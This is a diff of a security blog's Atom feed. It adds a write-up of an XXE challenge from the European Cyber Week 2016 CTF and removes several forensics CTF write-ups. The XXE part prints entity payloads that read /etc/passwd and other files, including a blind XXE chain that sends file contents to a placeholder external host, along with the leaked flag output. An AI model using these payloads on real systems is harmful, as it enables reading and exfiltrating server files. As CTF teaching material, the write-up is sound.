+<p><a href="https://www.gracefulsecurity.com/xml-external-entity-injection-xxe-vulnerabilities/" target="_blank" rel="external">xxe</a></p>
+<p>We are given the following form:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">contacts</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jean Dupont<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>00 11 22 33 44<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">adress</span>&gt;</span>42 rue CTF<span class="tag">&lt;/<span class="name">adress</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">zipcode</span>&gt;</span>42000<span class="tag">&lt;/<span class="name">zipcode</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">city</span>&gt;</span>ECW<span class="tag">&lt;/<span class="name">city</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jack Dupont<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>01 02 03 04 05<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">contacts</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>And the following answer confirming the well formated XML request:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Création du fichier ./MNfloDfo.xml</div><div class="line"></div><div class="line">Import du fichier :</div><div class="line"></div><div class="line">    Importation de &apos;Jean Dupont&apos; dans le carnet d&apos;adresses</div><div class="line">    Importation de &apos;Jack Dupont&apos; dans le carnet d&apos;adresses</div><div class="line"></div><div class="line">Suppression du fichier ./MNfloDfo.xml</div></pre></td></tr></table></figure>
+<p>We should be able to leak data into the answer banner.</p>
+<p>Confirmation that entities are interpreted:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE contacts</span></div><div class="line">[&lt;!ENTITY xxe "XXE vuln"&gt;]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">contacts</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;t<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>00 11 22 33 44<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">adress</span>&gt;</span>42 rue CTF<span class="tag">&lt;/<span class="name">adress</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">zipcode</span>&gt;</span>42000<span class="tag">&lt;/<span class="name">zipcode</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">city</span>&gt;</span>ECW<span class="tag">&lt;/<span class="name">city</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jack Dupont<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>01 02 03 04 05<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">contacts</span>&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Création du fichier ./J2tuDR8g.xml</div><div class="line"></div><div class="line">Import du fichier :</div><div class="line"></div><div class="line">    Importation de &apos;XXE vulnt&apos; dans le carnet d&apos;adresses</div><div class="line">    Importation de &apos;Jack Dupont&apos; dans le carnet d&apos;adresses</div><div class="line"></div><div class="line">Suppression du fichier ./J2tuDR8g.xml</div></pre></td></tr></table></figure>
+<p>Nice that’s working so try to leak some files:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE contacts</span></div><div class="line">[&lt;!ENTITY xxe SYSTEM "http://example.org/test"&gt;]&gt;</div></pre></td></tr></table></figure>
+<p>=&gt; doesn’t work</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></div></pre></td></tr></table></figure>
+<p>=&gt; doesn’t work</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" &gt;]&gt;</span></div></pre></td></tr></table></figure>
+<p>=&gt; doesn’t work</p>
+<p>[…] and we tried a lot of logical filename on various operating systems.</p>
+<p>But how did we find out the right? The challenge required no logic but only guessing …</p>
+<p>I firstly thought the banner was useless because no file was leaked in it. So I thought it was some blind xxe:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE contacts [ &lt;!ENTITY % pe SYSTEM &quot;http://example.org/xxe_file&quot;&gt; %pe; %param1; ]&gt;</div><div class="line">&lt;contacts&gt;</div><div class="line">  &lt;contact&gt;</div><div class="line">    &lt;name&gt;&amp;external;&lt;/name&gt;</div><div class="line">    [...]</div></pre></td></tr></table></figure>
+<p><code>xxe_file</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % payload SYSTEM &quot;file:///etc/passwd&quot;&gt;</div><div class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY external SYSTEM &apos;http://example.org/log_xxe?data=%payload;&apos;&gt;&quot;&gt;</div></pre></td></tr></table></figure>
+<p>And a tried a lot…</p>
+<p>But no, in fact no files were leakable exept <code>flag.txt</code>. It was impossible to find out it was just guessing because rules and description didn’t mention any convention.</p>
+<p>I passed hours on days to craft sophishticated blind xxe requests and it was only a very easy xxe but filename had to be guessed, it was easy to think that xxe was not working as others files was not leaked.</p>
+<p>Realistic challenge should have be better.</p>
+<p>But indeed some people find it realy easily as <code>flag.txt</code> can be common in CTF.</p>
+<p>I insist on the fact that’s is only CTF guessing, in real life this never occurs.</p>
+<p>Here was the easy XXE :</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE contacts</span></div><div class="line">[&lt;!ENTITY xxe SYSTEM "flag.txt"&gt;]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">contacts</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>00 11 22 33 44<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">adress</span>&gt;</span>42 rue CTF<span class="tag">&lt;/<span class="name">adress</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">zipcode</span>&gt;</span>42000<span class="tag">&lt;/<span class="name">zipcode</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">city</span>&gt;</span>ECW<span class="tag">&lt;/<span class="name">city</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jack Dupont<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>01 02 03 04 05<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">contacts</span>&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Création du fichier ./WDpFYEM5.xml</div><div class="line"></div><div class="line">Import du fichier :</div><div class="line"></div><div class="line">    Importation de &apos;ECW&#123;8dd72b9b3095380de595d734492d69c9&#125; &apos; dans le carnet d&apos;adresses</div><div class="line">    Importation de &apos;Jack Dupont&apos; dans le carnet d&apos;adresses</div><div class="line"></div><div class="line">Suppression du fichier ./WDpFYEM5.xml</div></pre></td></tr></table></figure>
 ]]></content>
     
     <summary type="html">
@@ -433,77 +634,6 @@
       <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
     
       <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ECW - 150 - Alternative Persistent Threat - Forensics</title>
-    <link href="http://rawsec.ml/en/ECW-2016-Alternative-Persistent-Threat/"/>
-    <id>http://rawsec.ml/en/ECW-2016-Alternative-Persistent-Threat/</id>
-    <published>2016-11-05T23:00:00.000Z</published>
-    <updated>2016-11-07T21:44:43.303Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
-<thead>
-<tr>
-<th>By</th>
-<th>Version</th>
-<th>Comment</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>noraj</td>
-<td>1.0</td>
-<td>Creation</td>
-</tr>
-</tbody>
-</table>
-<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
-<li><strong>Name</strong> : European Cyber Week CTF Quals 2016</li>
-<li><strong>Website</strong> : <a href="https://challenge-ecw.fr/" target="_blank" rel="external">challenge-ecw.fr</a></li>
-<li><strong>Type</strong> : Online</li>
-<li><strong>Format</strong> : Jeopardy - Student</li>
-</ul>
-<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.A.</p>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>We used <a href="http://www.arxsys.fr/discover/" target="_blank" rel="external">Digital Forensics Framework (DFF)</a></p>
-<p>We can view that <strong>usb.dd</strong> is NTFS partition in the hex view so we mounted it as it.</p>
-<p>We browsed the files and this one retaind our attention: <code>usb.dd/NTFS/Users/windows/Documents/tmp_rqsu78.docx:flag</code>.</p>
-<p>Its content is:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;Get the data from the default value of the key HKLM\SYSTEM\CurrentControlSet\Control\DeviceContainers\&#123;000001111-2345178-232416-99801&#125;&apos;</div></pre></td></tr></table></figure>
-<p>So we need to find Windows registry and browse it.</p>
-<blockquote>
-<p>The location of these registry hives are as follows:<br><code>HKEY_LOCAL_MACHINE \SYSTEM</code> : <code>\system32\config\system</code></p>
-</blockquote>
-<p>Source: <a href="http://www.thewindowsclub.com/where-are-the-windows-registry-files-located-in-windows-7" target="_blank" rel="external">http://www.thewindowsclub.com/where-are-the-windows-registry-files-located-in-windows-7</a></p>
-<p>We browsed it and the value of the key was: <code>a2486aac827711258d0642176cc4f8c2</code>.</p>
-<p>So the flag is <code>ECW{a2486aac827711258d0642176cc4f8c2}</code>.</p>
-<p><strong>Bonus</strong>:</p>
-<ul>
-<li><code>/Logical files/temp/usb.dd/NTFS/!j3CtfuSD5zz1RfB=MlsL]u-k8O5v+,P</code> was certainly the target location of the attack.</li>
-<li>There was also a <code>no flag here.txt</code> troll file in <code>Windows\system32\config\</code> containing a pretty list of fake flags:</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">ECW&#123;ee4f493d149e634540b79ed030b3790e&#125;</div><div class="line">ECW&#123;ef20996f87a1c172223d1796f155cabb&#125;</div><div class="line">ECW&#123;78a4b8dd2614fea24d694aaad4e5ee7c&#125;</div><div class="line">ECW&#123;2942e64a0b3836b84aa18311be73804d&#125;</div><div class="line">ECW&#123;860d8070c9fed931856856b2957316d9&#125;</div><div class="line">ECW&#123;5c07ee2b8313b406a32325c7a2924011&#125;</div><div class="line">ECW&#123;20b1ab287f9f4485800b15ba9cb933b0&#125;</div><div class="line">ECW&#123;31470d8d9676ee5d17fe79317124d67a&#125;</div><div class="line">ECW&#123;c0ad5adadd6dc5871f4cc66370757d9a&#125;</div><div class="line">ECW&#123;d28aeba8bb169a6f628d77b7059e9110&#125;</div><div class="line">ECW&#123;c9f619827e73ce3d61048b0ddb49ec84&#125;</div><div class="line">ECW&#123;07c563dd9f91b19a18d8876e89188593&#125;</div><div class="line">ECW&#123;46f8ba8cd62e3334e05501407d653587&#125;</div><div class="line">ECW&#123;d55e0d52fa7c5ccb0af9efa488f5206d&#125;</div><div class="line">ECW&#123;269c20f280f7326c674811f59ece9cab&#125;</div><div class="line">ECW&#123;656122abbb817863ae145539bb0eeb03&#125;</div><div class="line">ECW&#123;d1b46e0fa5e5c0375ade62ff820ce631&#125;</div><div class="line">ECW&#123;62fd1f329ac8d59e6c4052e45b6121bf&#125;</div><div class="line">ECW&#123;c4393a542ae85e178cf7da6cee80139d&#125;</div><div class="line">ECW&#123;0ae1fcf8c1b5e378ba62736d59ab346c&#125;</div><div class="line">ECW&#123;31e42f6a1adeb6350cda9270c164855f&#125;</div><div class="line">ECW&#123;6a1dd34361fe943af6a4c4a71584ac2f&#125;</div><div class="line">ECW&#123;bc65d36be9d0c6877cc0b200002e4e2d&#125;</div><div class="line">ECW&#123;a0a7c3fff21f2aea3cfa1d0316dd816c&#125;</div><div class="line">ECW&#123;4cf2d64e44205fe628ddd534e1151b58&#125;</div><div class="line">ECW&#123;9cc72dc973e24f9623bd3fe708f60ef5&#125;</div><div class="line">ECW&#123;579a3c1e12a1e74a98169175fb913012&#125;</div><div class="line">ECW&#123;2b7ea5cee3c49ff53d41e00785eb974c&#125;</div><div class="line">ECW&#123;a4a7e457b55b5ac2877f7973dbba37e9&#125;</div><div class="line">ECW&#123;01b1688f97f94776baae85d77b06048b&#125;</div><div class="line">ECW&#123;9b64ca5761c6de555d7d1b3c948ecfeb&#125;</div><div class="line">ECW&#123;3ff6ba9cf6d8e5332978e057559b5562&#125;</div><div class="line">ECW&#123;7dfe15854212a30f346da5255c1d794b&#125;</div><div class="line">ECW&#123;f51b02427757e79621b5235d7efdf117&#125;</div><div class="line">ECW&#123;e0e8b9912a4793170fd23f7aa4c6d68c&#125;</div><div class="line">ECW&#123;036208b4a1ab4a235d75c181e685e5a3&#125;</div><div class="line">ECW&#123;a51a588dc98a55fbbb26cf2f64589bda&#125;</div><div class="line">ECW&#123;a51a588dc98a55fbbb26cf2f64589bda&#125;</div><div class="line">ECW&#123;a51a588dc98a55fbbb26cf2f64589bda&#125;</div><div class="line">ECW&#123;7fad9816d7334cc470e5dc82d06e222f&#125;</div><div class="line">ECW&#123;d69fc8c97d906264c98463b4bca59fd4&#125;</div><div class="line">ECW&#123;5088741fd5456ef3471fe11022575e03&#125;</div><div class="line">ECW&#123;4d3f80683b3b9021f517e5b9920d0126&#125;</div><div class="line">ECW&#123;73a00957034783b7b5c8294c54cd3e12&#125;</div><div class="line">ECW&#123;1f77c389e0a69652980c341170d0834b&#125;</div><div class="line">ECW&#123;b42d4ed9a6bf5cda33366c01be5d11cb&#125;</div><div class="line">ECW&#123;c9440da5b11074fca7966ecde2fe3c97&#125;</div><div class="line">ECW&#123;6258191d167c56dcdb51ae9fa2faee23&#125;</div><div class="line">ECW&#123;095fd6a167e3c0f7331a1a6b97969c83&#125;</div><div class="line">ECW&#123;40942c14fbaaff0523b88ab781900cfd&#125;</div><div class="line">ECW&#123;39e14ad7477262c347f2e6d927a6518c&#125;</div><div class="line">ECW&#123;cdfb31c9bd2ea0c6d87206224466ac75&#125;</div><div class="line">ECW&#123;663f929002e1547fd2bf67e72f1b85e0&#125;</div><div class="line">ECW&#123;2eedce1bca0150e3dcda7e77f4d8ecfd&#125;</div><div class="line">ECW&#123;35b88728559e409dd550eb818228c99e&#125;</div><div class="line">ECW&#123;469966e739df10b55c3c8ee3ad572617&#125;</div><div class="line">ECW&#123;5146da32deef5fee7df9461eeca13e7b&#125;</div></pre></td></tr></table></figure>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
-    
-    </summary>
-    
-      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
-    
-      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
-    
-    
-      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
-    
-      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
-    
-      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
-    
-      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
     
   </entry>
   
@@ -1000,109 +1130,9 @@
     
       <category term="security" scheme="http://rawsec.ml/tags/security/"/>
     
-      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
-    
       <category term="php" scheme="http://rawsec.ml/tags/php/"/>
     
-  </entry>
-  
-  <entry>
-    <title>CSAW CTF - 50 - Kill - Forensics</title>
-    <link href="http://rawsec.ml/en/CSAW-2016-50-kill-forensics/"/>
-    <id>http://rawsec.ml/en/CSAW-2016-50-kill-forensics/</id>
-    <published>2016-09-17T22:00:00.000Z</published>
-    <updated>2016-10-12T21:07:54.498Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
-<thead>
-<tr>
-<th>By</th>
-<th>Version</th>
-<th>Comment</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>noraj</td>
-<td>1.0</td>
-<td>Creation</td>
-</tr>
-</tbody>
-</table>
-<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
-<li><strong>Name</strong> : CSAW CTF Qualification Round 2016</li>
-<li><strong>Website</strong> : <a href="https://ctf.csaw.io/" target="_blank" rel="external">https://ctf.csaw.io/</a></li>
-<li><strong>Type</strong> : Online</li>
-<li><strong>Format</strong> : Jeopardy</li>
-<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/347" target="_blank" rel="external">link</a></li>
-</ul>
-<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>Is kill can fix? Sign the autopsy file?</p>
-<p><a href="https://ctf.csaw.io/static/uploads/a23ef5ecca7f30b77f59f21dba413b07/kill.pcapng" target="_blank" rel="external">kill.pcapng</a></p>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ul>
-<li>If you look at the presumed PcapNg file you can see it is certainly broken because you can’t open it with <a href="https://www.wireshark.org/" target="_blank" rel="external">Whireshark</a> and the <code>file</code> command shows it as raw data.</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">┌─[root@parrot]─[~/CTF/CSAW/2016/Qualification/50-kill-forensics]</div><div class="line">└──╼ #file kill.pcapng</div><div class="line">kill.pcapng: data</div></pre></td></tr></table></figure>
-<ul>
-<li>It’s certainly more than just a wrong header signature so we’ll use the <a href="https://f00l.de/pcapfix/" target="_blank" rel="external">pcapcfix</a> tool  to fix this.</li>
-<li>As there is no more header we have to use <code>--pcapng</code> option because default behaviour of the tool is to repair as a simple pcap file.</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">┌─[root@parrot]─[~/CTF/CSAW/2016/Qualification/50-kill-forensics]</div><div class="line">└──╼ #/root/CTF/tools/pcapfix-1.1.0/pcapfix --pcapng kill.pcapng</div><div class="line">pcapfix 1.1.0 (c) 2012-2014 Robert Krause</div><div class="line"></div><div class="line">[*] Reading from file: kill.pcapng</div><div class="line">[*] Writing to file: fixed_kill.pcapng</div><div class="line">[*] File size: 2288848 bytes.</div><div class="line">[*] Unknown file type. Assuming PCAPNG format.</div><div class="line">[-] Unknown block type!: 0xaaddddaa ==&gt; SKIPPING.</div><div class="line">[-] Block size mismatch (0x1a2b3c4d != 0x0000008c) ==&gt; CORRECTED.</div><div class="line">[-] Found 128 bytes of unknown data ==&gt; SKIPPING.</div><div class="line">[-] No Section Block header found ==&gt; CREATING.</div><div class="line">[*] Progress:  20.02 %</div><div class="line">[*] Progress:  40.01 %</div><div class="line">[*] Progress:  60.04 %</div><div class="line">[*] Progress:  80.05 %</div><div class="line">[+] SUCCESS: 4 Corruption(s) fixed!</div></pre></td></tr></table></figure>
-<ul>
-<li>Now look at the file, it seems better!</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">┌─[root@parrot]─[~/CTF/CSAW/2016/Qualification/50-kill-forensics]</div><div class="line">└──╼ #file fixed_kill.pcapng</div><div class="line">fixed_kill.pcapng: pcap-ng capture file - version 1.0</div></pre></td></tr></table></figure>
-<ul>
-<li>Now open the Pcap-Ng file with wireshark.</li>
-<li>This is mainly a SFTP exchange so it may be interesting to look at downloaded filess with this filter: Filter <code>ftp.request.command == STOR</code>.</li>
-<li>Filter show us 7 downloaded files at frame 53, 130, 693, 760, 813, 2325 and 2480. 5 jpg files (image) and 2 mp4 files (video).</li>
-<li>So let’s extract images first. For that we need the jpg header file signature. It can be found here <a href="https://en.wikipedia.org/wiki/List_of_file_signatures" target="_blank" rel="external">on Wikipedia</a>.</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">JPEG RAW `FF D8 FF DB`</div><div class="line">JFIF begin with `FF D8 FF E0`</div><div class="line">EXIF `FF D8 FF E1`</div></pre></td></tr></table></figure>
-<ul>
-<li>The one interesting for us is <strong>JFIF</strong>.</li>
-<li>Press <code>CTRL + F</code>, select <strong>Hex value</strong> as <strong>Display filter</strong>.</li>
-<li>Note that it’s not necessary as the begining of the stream is not far after the STOR request command.</li>
-<li>We won’t need to extract mp4 file, flag is in one of the images.</li>
-<li>Now there is two way to do it: the smart way and the dumb way.</li>
-<li><strong>Dumb way</strong>: see the flag in the ASCII representation of the frame 696 (girls.jpg). Ok it works, but if the flag have be not so badly hidden you won’t have seen it, for example if it was display on the image.</li>
-<li><strong>Smart way</strong>: Let’s extract images.</li>
-<li>Now that we know where are the files stream, we can extract files as mention:<ul>
-<li>Right click on the first frame of the stream.</li>
-<li>Click on <em>Follow TCP Stream</em>.</li>
-<li>Select <em>Raw</em> representation.</li>
-<li>Save it on your disk.</li>
-</ul>
-</li>
-</ul>
-<ul>
-<li>Do the same with next images.</li>
-</ul>
-<ul>
-<li>We can note that all images are seeable execpt girls.jpg. So what? A broken file again? Not really, if you want to see the file header in order to fix it, you discover that the flag was just injected in the file header.</li>
-<li>Let’s see the raw hex dump of the image:</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">┌─[root@parrot]─[~/CTF/CSAW/2016/Qualification/50-kill-forensics]</div><div class="line">└──╼ #xxd -l83 extract_girls.jpg</div><div class="line">00000000: ffd8 ffe0 bae0 4a46 4946 0001 0101 0001  ......JFIF......</div><div class="line">00000010: 0001 0000 fffe 003d 666c 6167 7b72 6f73  .......=flag&#123;ros</div><div class="line">00000020: 6573 5f72 5f62 6c75 655f 7669 6f6c 6574  es_r_blue_violet</div><div class="line">00000030: 735f 725f 7233 645f 6d61 7962 335f 6861  s_r_r3d_mayb3_ha</div><div class="line">00000040: 7261 6d62 6165 5f69 735f 6e6f 745f 6b69  rambae_is_not_ki</div><div class="line">00000050: 6c6c 7d                                  ll&#125;</div></pre></td></tr></table></figure>
-<p>Thanks to <a href="https://shankaraman.wordpress.com/tag/how-to-extract-ftp-files-from-wireshark-packet/" target="_blank" rel="external">Shankar Raman</a>.</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
-    
-    </summary>
-    
-      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
-    
-      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
-    
-    
-      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
-    
-      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
-    
-      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
-    
-      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
+      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
     
   </entry>
   
@@ -1242,67 +1272,6 @@
       <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
     
       <category term="reconnaissance" scheme="http://rawsec.ml/tags/reconnaissance/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>CSAW CTF - 25 - Coinslot - Misc</title>
-    <link href="http://rawsec.ml/en/CSAW-2016-25-coinslot-misc/"/>
-    <id>http://rawsec.ml/en/CSAW-2016-25-coinslot-misc/</id>
-    <published>2016-09-17T22:00:00.000Z</published>
-    <updated>2016-10-12T21:07:54.495Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
-<thead>
-<tr>
-<th>By</th>
-<th>Version</th>
-<th>Comment</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>noraj</td>
